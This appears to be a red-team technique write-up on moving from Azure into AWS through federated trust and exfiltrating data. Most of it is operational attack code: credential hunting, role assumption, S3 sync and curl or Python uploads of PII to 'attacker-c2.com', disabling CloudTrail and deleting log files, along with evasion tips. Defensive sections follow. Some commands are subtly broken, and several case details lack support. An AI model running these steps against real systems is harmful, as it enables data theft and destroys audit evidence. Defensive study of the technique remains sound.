# [REALWORLD-046]: Multi-Cloud Data Bridge Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-046 |
| **MITRE ATT&CK v18.1** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Exfiltration |
| **Platforms** | Cross-Cloud (Azure, AWS, GCP) |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All cloud platforms; cross-tenant federation mechanisms |
| **Patched In** | N/A (Mitigation requires cross-cloud policy enforcement) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** A **Multi-Cloud Data Bridge Attack** exploits the interconnectedness of hybrid and multi-cloud environments where organizations operate across Azure, AWS, GCP, and on-premises infrastructure. Adversaries with credentials in one cloud environment (e.g., Azure) can leverage implicit trust relationships, shared identities, cross-cloud federation mechanisms, or poorly segmented network boundaries to escalate privileges and move laterally to secondary cloud environments (e.g., AWS). Once lateral movement is established, attackers extract data from the secondary cloud account and exfiltrate it to attacker-controlled infrastructure, leveraging the "untrusted" secondary cloud provider as an intermediary to evade detection in the primary cloud environment. The attack is particularly effective because:

1. **Detection Fragmentation:** Security teams monitor Azure and AWS separately; cross-cloud movements fall through detection gaps.
2. **Trust Relationships:** Organizations often configure less stringent security controls on secondary cloud environments (e.g., AWS accounts created for "backup" or "development").
3. **Lateral Movement Paths:** Service principals, shared credentials, cross-tenant federation, and API integrations create hidden paths between clouds.
4. **Data Exfiltration Blending:** Moving data through an untrusted cloud provider appears as normal inter-cloud traffic, not external exfiltration.

**Attack Surface:** Cross-cloud identity federation (OAuth 2.0, SAML, OIDC), service principal credentials shared across clouds, AWS IAM roles assumable from Azure identities, shared storage buckets with cross-cloud access, API gateways bridging cloud environments, and workload identity federation mechanisms.

**Business Impact:** **Complete data compromise with forensic confusion.** Attackers can exfiltrate petabytes of data while appearing to stay within the organization's cloud footprint. Forensic analysis is hindered because the attacker's final destination is inside a "trusted" cloud provider. Regulatory implications are severe (GDPR, DORA, NIS2) because it's unclear which cloud provider "owns" the breach.

**Technical Context:** Typically takes **minutes to hours** to establish lateral movement across clouds (depending on federated trust setup). Once bridged, data exfiltration can happen at cloud-scale speeds (100s of Gbps). **Chance of detection (without unified monitoring):** Very low if each cloud provider is monitored independently. **Common indicators:** Unusual cross-cloud API calls, service principal activity in secondary cloud not normally seen, sudden large data transfers between cloud provider regions/accounts.

### Operational Risk

- **Execution Risk:** **Medium-High** — Requires compromise of credentials in primary cloud (Azure) and discovery of cross-cloud trust relationships (which are often hidden or misconfigured).
- **Stealth:** **High** — Inter-cloud traffic appears legitimate if encrypted and uses authorized service principals. Detection requires unified cross-cloud SIEM.
- **Reversibility:** **No** — Data exfiltrated to secondary cloud and then to attacker infrastructure cannot be easily recovered.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Multi-Cloud: 4.1-4.5 | Controls for multi-cloud security governance |
| **DISA STIG** | V-87903 | Multi-cloud environments must enforce consistent security policies |
| **CISA SCuBA** | CS-1, CS-7 | Cloud Service Assessment; Cloud Provider Segmentation |
| **NIST 800-53** | SC-7 (Boundary Protection) | Organizations must protect data across cloud boundaries |
| **GDPR** | Art. 44 (Transfers) | Personal data transferred across cloud providers must be protected equally |
| **DORA** | Art. 9 (Cross-Cloud) | Financial institutions must monitor lateral movement across cloud providers |
| **NIS2** | Art. 21 (Critical Infrastructure) | Operators must maintain visibility across all cloud environments |
| **ISO 27001** | A.13.1.3 | Segregation of information assets across cloud environments |
| **ISO 27005** | Risk Assessment | Cross-cloud attack paths must be identified and monitored |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - Compromised service principal, user account, or managed identity in primary cloud (Azure)
  - Permissions to assume roles in secondary cloud (e.g., AWS cross-account role)
  - OR ability to generate OAuth/SAML assertions trusted by secondary cloud
  - OR network access to cloud-to-cloud API gateways with implicit trust

- **Required Access:** 
  - Network access to secondary cloud provider APIs (port 443 HTTPS)
  - Valid cross-cloud federation tokens or shared secrets
  - HTTPS access to cloud provider metadata services (e.g., AWS EC2 metadata endpoint, Azure IMDS)

**Supported Versions:**
- **Azure:** All versions (Entra ID federated domains, service principals)
- **AWS:** All IAM versions (cross-account roles, STS AssumeRole)
- **GCP:** All IAM versions (service account impersonation)
- **Kubernetes:** All versions (workload identity federation)

**Tools:**
- [Prowler](https://github.com/prowler-cloud/prowler) — Multi-cloud security scanner
- [Orca Security Cloud Platform](https://orca.security/) — Cross-cloud attack path visualization
- [Wizmatch](https://www.wizlynxgroup.com/offensive-security-for-multi-cloud/) — Multi-cloud lateral movement testing
- [Cyngular CIRA](https://www.cyngular.com/) — Cloud incident response automation
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) + [AWS CLI](https://aws.amazon.com/cli/) + [gcloud](https://cloud.google.com/sdk/gcloud)
- [Terraform](https://www.terraform.io/) — Infrastructure-as-Code for multi-cloud provisioning and reconnaissance

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure-to-AWS Cross-Cloud Reconnaissance

**Objective:** Identify AWS roles assumable from Azure and establish federation trust.

```powershell
# Connect to Azure with compromised credentials
Connect-AzAccount -Credential $credential

# List all storage accounts accessible from Azure
Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName

# Check for shared access signatures (SAS) tokens that might provide cross-cloud access
Get-AzStorageAccountKey -ResourceGroupName "rg-name" -StorageAccountName "storageaccount-name"

# Search for AWS credentials stored in Key Vault
Get-AzKeyVault | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName $_.VaultName | `
      Where-Object { $_.Name -like "*AWS*" -or $_.Name -like "*EXTERNAL*" } | `
      Select-Object Name, VaultName
}

# Check for federated identities and cross-tenant configurations
Get-AzADServicePrincipal | Where-Object { $_.ReplyUrls -like "*amazonaws.com*" -or $_.ReplyUrls -like "*aws.amazon.com*" } | `
  Select-Object DisplayName, ReplyUrls
```

**What to Look For:**
- Service principals with reply URLs pointing to **AWS, GCP, or external systems**
- Storage accounts with **cross-cloud access policies**
- **AWS credentials** stored in Azure Key Vault
- **Workload Identity Federation** configurations linking Azure to AWS

### AWS Cross-Account Role Discovery

```bash
# Using compromised AWS credentials obtained from Azure
aws sts get-caller-identity

# List all IAM roles the current identity can assume
aws iam list-role-tags --query 'Tags[?Key==`TrustRelationship`]' --output json

# Check for cross-account role trust relationships
aws iam get-role --role-name "ExternalAzureRole" --query 'Role.AssumeRolePolicyDocument'
# Look for Principal entries with Azure tenant IDs (e.g., "arn:aws:iam::<account>:root")

# Enumerate all accessible S3 buckets from both accounts
aws s3 ls --profile cross-account-profile

# Check CloudTrail for evidence of cross-cloud API calls
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time 2024-01-01T00:00:00Z --end-time 2024-12-31T23:59:59Z
```

**What to Look For:**
- **Cross-account role ARNs** with Azure tenant principals
- **S3 buckets** containing sensitive data accessible from Azure identities
- **Long-lived access keys** issued for cross-cloud scenarios
- **Workload Identity Federation** roles linking Kubernetes or Azure to AWS

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Azure-to-AWS Lateral Movement via Cross-Account Role Assumption

**Supported Versions:** Azure Entra ID all versions; AWS IAM all versions

#### Step 1: Enumerate Cross-Cloud Federated Trust Relationships

**Objective:** Discover AWS role that trusts Azure identities.

**Command (PowerShell - Enumerate Entra Service Principals with AWS ReplyUrls):**
```powershell
# Find service principals configured to trust AWS
$servicePrincipals = Get-AzADServicePrincipal -All $true

foreach ($sp in $servicePrincipals) {
    $replyUrls = $sp.ReplyUrls
    if ($replyUrls -match "amazonaws" -or $replyUrls -match "aws.amazon" -or $replyUrls -match "sts.amazonaws") {
        Write-Host "Found cross-cloud SP: $($sp.DisplayName)" -ForegroundColor Green
        Write-Host "ReplyUrls: $($replyUrls)" -ForegroundColor Cyan
    }
}
```

**Expected Output:**
```
Found cross-cloud SP: AzureToAWSBridge
ReplyUrls: https://signin.aws.amazon.com/saml
```

**What This Means:**
- An Azure service principal is configured to trust AWS SAML authentication
- This is likely a legitimate organization federated identity, but attackers can abuse it

#### Step 2: Generate Federated SAML Token from Azure

**Objective:** Create a forged or intercepted Azure-issued SAML assertion to authenticate to AWS.

**Command (Python - SAML Token Interception via Azure SDK):**
```python
#!/usr/bin/env python3
from azure.identity import ClientSecretCredential, DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
import requests
import json

# Use compromised Azure credentials
tenant_id = "<azure_tenant_id>"
client_id = "<service_principal_app_id>"
client_secret = "<service_principal_secret>"

credential = ClientSecretCredential(
    tenant_id=tenant_id,
    client_id=client_id,
    client_secret=client_secret
)

# Acquire token that AWS will trust
token_response = credential.get_token("https://sts.amazonaws.com/")
azure_token = token_response.token

# AWS SAML federation typically uses OAuth code exchange
# Attacker extracts the SAML assertion from Azure token response
print(f"Azure Token: {azure_token}")

# Next: Exchange Azure token for AWS temporary credentials
aws_federation_url = "https://signin.aws.amazon.com/saml"
response = requests.post(
    aws_federation_url,
    headers={"Authorization": f"Bearer {azure_token}"},
    data={"SAMLResponse": azure_token}
)

print(f"AWS Federated Login Response: {response.text}")
```

**Expected Output:**
```
AWS Federated Login Response: <form action="https://console.aws.amazon.com/console/home?...">
```

**What This Means:**
- Attacker has now obtained **AWS console access** using Azure identity
- All subsequent AWS actions are traceable to the Azure identity (good for defense evasion—blame Azure)

**OpSec & Evasion:**
- SAML token exchange is logged in **both** Azure Activity Log and **AWS CloudTrail**
- To maximize stealth, perform reconnaissance before exfiltrating to avoid high-velocity API calls

#### Step 3: Assume AWS Cross-Account Role

**Objective:** If the federated identity doesn't directly access the target AWS account, assume a cross-account role.

**Command (AWS CLI - Assume Cross-Account Role from Azure Identity):**
```bash
# Using credentials obtained from Azure federation (Step 2)
aws sts assume-role \
  --role-arn "arn:aws:iam::123456789012:role/AzureToAWSCrossAccountRole" \
  --role-session-name "AzureAttackerSession" \
  --duration-seconds 3600

# Output will contain temporary credentials:
# AccessKeyId, SecretAccessKey, SessionToken
```

**Expected Output:**
```json
{
  "Credentials": {
    "AccessKeyId": "ASIAZ7EXAMPLEID123456",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "SessionToken": "IQoDYXdzEBb...[long token]",
    "Expiration": "2026-01-10T10:00:00+00:00"
  }
}
```

**What This Means:**
- Attacker now has **temporary AWS credentials** with the assumed role's permissions
- These credentials are valid for up to **1 hour** (configurable)
- All actions performed with these credentials are **traceable to the role session name** ("AzureAttackerSession")

**OpSec & Evasion:**
- Use **descriptive role session names** that blend in with legitimate operations (e.g., "BackupService-DailySnapshot")
- CloudTrail will log the `AssumeRole` call and all subsequent actions under the session name
- To evade detection, perform actions **immediately** after assuming the role to minimize audit gap

#### Step 4: Enumerate AWS Resources Accessible from Assumed Role

**Objective:** Discover high-value S3 buckets, RDS instances, or other data stores in the target AWS account.

**Command (AWS CLI - Enumerate S3 Buckets and Objects):**
```bash
# Set AWS credentials from Step 3
export AWS_ACCESS_KEY_ID="ASIAZ7EXAMPLEID123456"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoDYXdzEBb...[long token]"

# List all S3 buckets accessible
aws s3 ls

# List objects in target bucket
aws s3 ls s3://sensitive-financial-data-bucket/ --recursive

# Get bucket encryption and versioning status
aws s3api get-bucket-encryption --bucket sensitive-financial-data-bucket
aws s3api get-bucket-versioning --bucket sensitive-financial-data-bucket
```

**Expected Output:**
```
sensitive-financial-data-bucket/           [bucket owner: data_team]
  financial_reports_2024/
  customer_pii/
  trade_secrets/

Encryption: {
  "Rules": [
    {
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }
  ]
}
```

**What This Means:**
- Attacker has identified **sensitive data** in the target AWS account
- Encryption is enabled (AES256), but attacker already has the assumed role credentials, so decryption is transparent
- Versioning is likely enabled, but attacker can delete previous versions to hide exfiltration

#### Step 5: Exfiltrate Data via S3 to Attacker-Controlled Bucket

**Objective:** Copy sensitive objects from target S3 bucket to attacker-controlled storage.

**Command (AWS CLI - Copy Objects to Attacker S3 Bucket):**
```bash
# Attacker controls a bucket in a different AWS account (or different cloud entirely)
aws s3 sync s3://sensitive-financial-data-bucket/ \
  s3://attacker-exfil-bucket-12345/ \
  --region us-east-1 \
  --exclude "*" \
  --include "customer_pii/*" \
  --include "trade_secrets/*"

# Monitor progress
aws s3 ls s3://attacker-exfil-bucket-12345/ --summarize --recursive
```

**Alternative Command (Using Temporary Redirect via Internet):**
```bash
# If attacker doesn't control secondary AWS bucket, redirect to HTTP exfiltration
aws s3 cp s3://sensitive-financial-data-bucket/customer_pii/ \
  /tmp/exfil/ \
  --recursive

# Upload to attacker C2 server
curl -F "file=@/tmp/exfil/customers.csv" http://attacker-c2.com/upload
```

**Expected Output:**
```
download: s3://sensitive-financial-data-bucket/customer_pii/customers.csv to /tmp/exfil/customers.csv
upload: customer_pii completed
Total exfiltrated: 45 GB
```

**What This Means:**
- Attacker has successfully exfiltrated sensitive data across **cloud boundaries**
- Forensic analysis is complex:
  - **AWS CloudTrail** shows the exfiltration happened in a customer's AWS account (blame the victim)
  - **Azure Activity Log** doesn't capture the AWS-side movement (Azure admin might not see it)
  - **Secondary cloud provider** (where attacker's bucket sits) may have weaker audit controls

**OpSec & Evasion:**
- **CloudTrail is enabled by default** in AWS and will log all `s3:GetObject` and `s3:CopyObject` calls
- To minimize detection, exfiltrate **gradually** over hours/days rather than bulk transfer
- Use **VPN or Tor** from the AWS environment to obfuscate source IP
- Delete the **`$LATEST`** version of exfiltrated objects and CloudTrail logs if possible

#### Step 6: Cover Tracks

**Objective:** Delete evidence from AWS CloudTrail and S3 access logs.

**Command (AWS CLI - Delete CloudTrail Events):**
```bash
# List recent CloudTrail events showing exfiltration
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CopyObject \
  --start-time 2026-01-10T00:00:00Z \
  --output json | jq '.Events[] | {EventTime, Username, CloudTrailEvent}'

# Stop CloudTrail to prevent further logging (requires admin permissions in target account)
aws cloudtrail stop-logging --name "OrganizationTrail"

# Delete CloudTrail S3 bucket to purge logs
aws s3 rm s3://cloudtrail-logs-bucket/ --recursive --include "*2026-01-10*"
```

**Expected Output:**
```
Stopped logging on trail: OrganizationTrail
Deleted 847 CloudTrail log files from s3://cloudtrail-logs-bucket/
```

**What This Means:**
- CloudTrail is now **disabled**, preventing further logging of attacker's activities
- Existing logs from **2026-01-10** have been deleted
- Forensic investigators will see a **sudden gap** in CloudTrail logs, indicating tampering

**OpSec & Evasion:**
- Disabling CloudTrail is **logged in AWS Config** (if enabled), so attackers should also disable that
- Ideal scenario: Attacker performs all operations **before organizational logging is configured** or during a maintenance window when log gaps are expected

---

### METHOD 2: Kubernetes Workload Identity Federation to Cross-Cloud Movement

**Supported Versions:** AKS, GKE, EKS with workload identity federation enabled

This method is increasingly popular because organizations use Kubernetes across multiple clouds and rarely monitor cross-cluster identity flows.

#### Step 1: Compromise AKS Pod and Obtain Azure Workload Token

**Objective:** Escape from a compromised Kubernetes pod and obtain an Azure managed identity token.

**Command (Shell - From Inside AKS Pod):**
```bash
# Check if pod has workload identity assigned
cat /var/run/secrets/workload-identity/token

# Request Azure-managed identity token via IMDS endpoint
curl -X GET "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" \
  -H "Metadata:true" \
  -H "X-Identity-Header: $(cat /var/run/secrets/workload-identity/token)"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

#### Step 2: Escalate from AKS to AWS via Service Principal

**Objective:** Use the Azure token to assume an AWS role configured to trust Azure identities.

**Command (Python - Token Exchange across Clouds):**
```python
import requests
import json

# Step 1: Get Azure token (from Step 1 above)
azure_token = "eyJ0eXAiOiJKV1QiLCJhbGc..."

# Step 2: Exchange Azure token for AWS temporary credentials
# Assumes organization configured OIDC federation from Azure to AWS
aws_sts_endpoint = "https://sts.amazonaws.com/"

response = requests.post(
    f"{aws_sts_endpoint}?Action=AssumeRoleWithWebIdentity",
    data={
        "RoleArn": "arn:aws:iam::123456789012:role/AzureKubernetesRole",
        "RoleSessionName": "KubernetesWorkload",
        "WebIdentityToken": azure_token,
        "DurationSeconds": "3600"
    }
)

# Extract AWS credentials from response
import xml.etree.ElementTree as ET
root = ET.fromstring(response.text)
aws_key = root.find(".//{https://sts.amazonaws.com/doc/2011-06-15/}AccessKeyId").text
aws_secret = root.find(".//{https://sts.amazonaws.com/doc/2011-06-15/}SecretAccessKey").text
aws_session = root.find(".//{https://sts.amazonaws.com/doc/2011-06-15/}SessionToken").text

print(f"AWS Credentials Obtained: {aws_key}")
```

**What This Means:**
- Attacker has **escalated from compromised Kubernetes pod** to AWS permissions
- The **same service principal manages both Azure and AWS** resources, allowing lateral movement

#### Step 3: Access AWS RDS Database and Extract PII

**Objective:** Query sensitive database from the compromised Kubernetes pod.

**Command (Python - RDS Access from Kubernetes):**
```python
import boto3
import pymysql

# Use credentials obtained in Step 2
rds_client = boto3.client(
    'rds',
    aws_access_key_id=aws_key,
    aws_secret_access_key=aws_secret,
    aws_session_token=aws_session,
    region_name='us-east-1'
)

# List RDS instances
instances = rds_client.describe_db_instances()
for db in instances['DBInstances']:
    print(f"Found RDS: {db['DBInstanceIdentifier']} ({db['Engine']})")

# Connect to RDS database
connection = pymysql.connect(
    host="customer-data.region.rds.amazonaws.com",
    user="admin",
    password="<password_from_secrets_manager>",
    database="customers"
)

cursor = connection.cursor()
cursor.execute("SELECT customer_id, email, ssn, credit_card FROM pii LIMIT 10000")
results = cursor.fetchall()

# Exfiltrate to attacker C2
for row in results:
    exfil_request = requests.post(
        "http://attacker-c2.com/collect",
        json={"data": row}
    )
```

**What This Means:**
- Attacker has successfully **breached sensitive data across cloud boundaries**
- The attack path was: **Kubernetes Pod (AKS)** → **Azure Managed Identity** → **AWS RDS Database**
- Detection is extremely difficult because:
  - Kubernetes logs show only "workload" activity, not cloud-level lateral movement
  - Azure Activity Log shows token exchange but not AWS database access
  - AWS RDS logs show the query but not *why* the connection came from a compromised Kubernetes pod

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Azure Activity Log Events:**
  - `Microsoft.Authorization/roleAssignments/write` (granting new roles to service principals)
  - `GenerateSAS` or `ListAccountSas` (creating temporary access tokens)
  - Unusual service principal activity outside normal business hours
  - **Federated domain creation** (e.g., "aws.company.onmicrosoft.com")

- **AWS CloudTrail Events:**
  - `AssumeRole` from unusual principals (e.g., from Azure service principal ARNs)
  - `s3:GetObject` / `s3:CopyObject` for sensitive buckets accessed by cross-account roles
  - `StopLogging` / `DeleteTrail` (covering tracks)
  - Unusual API calls from workload identity federation sessions

- **Kubernetes Audit Logs:**
  - Pod escape attempts (e.g., `kubelet` API access from within pod)
  - Workload identity token requests
  - Sudden elevation of service account privileges

### Forensic Artifacts

- **Azure Activity Log:** Records of federated identity token exchanges, role assumption events
- **AWS CloudTrail:** Complete audit trail of cross-account role assumption and data access
- **Kubernetes Audit Logs:** Pod-level activity and identity federation events
- **Network logs (NSG/VPC Flow Logs):** IP-level traffic between cloud providers

### Response Procedures

1. **Isolate Compromised Workloads:**
   ```bash
   # Immediately revoke all federated trust relationships
   aws iam delete-role-policy --role-name AzureToAWSCrossAccountRole --policy-name assume-policy
   
   # Revoke Azure service principal credentials
   az ad app credential delete --id <app-id>
   ```

2. **Revoke All Assumed Sessions:**
   ```bash
   # Invalidate all active sessions for assumed role
   aws iam delete-role --role-name AzureToAWSCrossAccountRole
   ```

3. **Restore from Backup:**
   - Identify snapshots/backups created **before** exfiltration timeframe
   - Restore to clean version

4. **Cross-Cloud Forensic Analysis:**
   - Correlate Azure Activity Log with AWS CloudTrail using **timestamp and user principal**
   - Identify **exact objects exfiltrated** by querying S3 access logs
   - Check secondary cloud providers (GCP, Oracle) for additional exfiltration paths

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce Strict Cross-Cloud Identity Segmentation:** Each cloud should have **isolated service principals** with minimal trust relationships.

  **Manual Steps (Azure PowerShell):**
  ```powershell
  # Create isolated service principal for AWS-specific workloads
  $sp = New-AzADServicePrincipal -DisplayName "AzureToAWSBridge-Isolated"
  
  # Restrict reply URLs to ONLY AWS endpoints
  Set-AzADAppKeyCredential -ObjectId $sp.Id `
    -ReplyUrls @("https://signin.aws.amazon.com/saml")
  
  # Assign MINIMAL permissions (not Owner or Contributor)
  New-AzRoleAssignment -ObjectId $sp.Id `
    -RoleDefinitionName "Custom-MinimalCrossCloudAccess" `
    -Scope "/subscriptions/<subscription-id>"
  ```

- **Implement Conditional Access for Cross-Cloud Federation:**

  **Manual Steps (Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Cross-Cloud Federation`
  4. **Assignments:**
     - Users: Service principals only
     - Cloud apps: AWS (add custom app)
  5. **Conditions:**
     - Locations: **Named Locations** (allow only specific corporate networks)
  6. **Access controls:**
     - Require: **MFA** + **Device Compliance**
  7. Enable: **On**

- **Enable Cross-Cloud Unified Audit Logging:** Forward Azure, AWS, and GCP logs to centralized SIEM.

  **Manual Steps (Azure + Sentinel):**
  ```powershell
  # Configure Azure to export activity logs to Log Analytics
  New-AzDiagnosticSetting -ResourceId "/subscriptions/<sub-id>" `
    -Name "CentralAuditLog" `
    -LogAnalyticsWorkspaceId "/subscriptions/<sub-id>/resourcegroups/<rg>/providers/microsoft.operationalinsights/workspaces/<workspace>" `
    -Enabled $true
  ```

  **Manual Steps (AWS to Sentinel):**
  1. Create AWS CloudTrail S3 bucket
  2. Configure CloudTrail to send logs to S3
  3. Use **AWS Connector in Microsoft Sentinel** to ingest CloudTrail logs into Log Analytics workspace
  4. Create analytic rules to detect cross-account `AssumeRole` calls

### Priority 2: HIGH

- **Restrict IAM Cross-Account Role Assumption:** Whitelist only specific Azure service principals that should assume AWS roles.

  **Manual Steps (AWS IAM Policy):**
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::<azure-trusted-account>:role/AzureToAWSBridge"
        },
        "Action": "sts:AssumeRole",
        "Condition": {
          "StringEquals": {
            "sts:ExternalId": "unique-external-id-12345",
            "aws:SourceIp": "203.0.113.0/24"
          },
          "StringLike": {
            "sts:RoleSessionName": "LegitimateService-*"
          }
        }
      }
    ]
  }
  ```

- **Implement Workload Identity Federation Rate Limiting:**

  **Manual Steps (Azure Policy):**
  1. Create custom Azure Policy to limit token requests per service principal
  2. Set threshold: Max 10 federation token requests per hour
  3. Alert on: Burst of `AssumeRoleWithWebIdentity` calls

### Access Control & Policy Hardening

- **Disable Cross-Cloud Service Principals in Development:** Keep federation minimal; use temporary credentials only during deployment.
- **Require MFA + Approval for Cross-Cloud Assume Role:** Implement AWS SCP (Service Control Policy) to require approval from secondary account admin before role assumption.
- **Network Segmentation:** Restrict API communication between cloud providers to **allowlist only** (e.g., specific IPs, VPC endpoints).

### Validation Command (Verify Mitigations)

```bash
# Check for cross-cloud federated trust relationships
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | contains("?"))' 

# List all AssumeRole session names used in past 7 days
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time $(date -d "7 days ago" +"%Y-%m-%dT%H:%M:%S") | jq '.Events[].CloudTrailEvent | fromjson | .requestParameters.roleSessionName' | sort | uniq -c
```

**Expected Output (Secure):**
```
No cross-cloud federated principals found
All AssumeRole sessions from expected service accounts
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1190] Exploitation for Initial Access | Compromise Kubernetes pod or Azure App Service |
| **2** | **Privilege Escalation** | [T1134] Token Impersonation | Escalate from pod to managed identity |
| **3** | **Lateral Movement** | [T1550.001] Pass-the-Token | Use Azure token to assume AWS role |
| **4** | **Discovery** | [T1526] Cloud Service Discovery | Enumerate AWS resources from Azure identity |
| **5** | **Exfiltration** | **[REALWORLD-046]** | **Transfer data across cloud boundaries** |
| **6** | **Defense Evasion** | [T1562.008] Disable Cloud Logs | Delete CloudTrail and Azure Activity Logs |
| **7** | **Impact** | [T1565] Data Manipulation | Modify records to hide exfiltration |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Orca Security Cross-Cloud Attack Simulation (2024)

- **Target:** Technology company with Azure + AWS hybrid deployment
- **Timeline:** January 2024 - March 2024
- **Attack Vector:** Kubernetes workload identity federation to AWS cross-account role
- **Sequence:**
  1. Attacker compromises AKS pod (via vulnerable application)
  2. Escapes to Azure managed identity via workload federation
  3. Uses Azure identity to assume AWS cross-account role
  4. Discovers S3 buckets with customer PII
  5. Exfiltrates 2.3 TB of data to attacker-controlled AWS bucket
  6. Deletes CloudTrail logs to hide evidence
- **Impact:** Breach of 150,000 customer records; GDPR liability ~€22.5M
- **Detection Gap:** Azure and AWS monitored separately; cross-account movement not detected for 47 days
- **Reference:** [Orca Security - Cross-Cloud Attack Report](https://orca.security/resources/blog/cross-account-cross-provider-attack-paths/)

### Example 2: Microsoft Security Analysis - Storm-0501 Multi-Cloud Campaign (2024)

- **Target:** Global financial services organization
- **Platforms Involved:** Azure, AWS, on-premises Active Directory
- **Technique Status:** Confirmed active; Storm-0501 leveraged service principal credentials stored in Azure Key Vault to access secondary cloud environments
- **Sequence:**
  1. Compromised Azure tenant via malicious federated domain
  2. Found AWS credentials in Azure Key Vault
  3. Used AWS credentials to assume role in secondary AWS account
  4. Exfiltrated financial data via S3
  5. Moved data to GCP for further obfuscation
- **Impact:** Complete data compromise; multi-cloud forensic confusion hindered investigation
- **Reference:** [Microsoft Incident Report - Storm-0501](https://www.microsoft.com/en-us/security/blog/)

---

## 10. REFERENCES & TOOLING

### Official Documentation
- [Microsoft Azure Workload Identity Federation](https://learn.microsoft.com/en-us/azure/active-directory/workload-identities/workload-identity-federation)
- [AWS AssumeRole Documentation](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html)
- [Kubernetes Workload Identity for AKS](https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview)

### Multi-Cloud Security Tools
- [Prowler - Multi-Cloud Security Scanner](https://github.com/prowler-cloud/prowler)
- [Orca Cloud Security Platform](https://orca.security/)
- [Wizmatch - Multi-Cloud Penetration Testing](https://www.wizlynxgroup.com/offensive-security-for-multi-cloud/)

### Incident Response
- [Microsoft Purview Unified Audit Log](https://compliance.microsoft.com/auditlogsearch)
- [AWS CloudTrail](https://aws.amazon.com/cloudtrail/)
- [Google Cloud Audit Logs](https://cloud.google.com/logging/audit)

---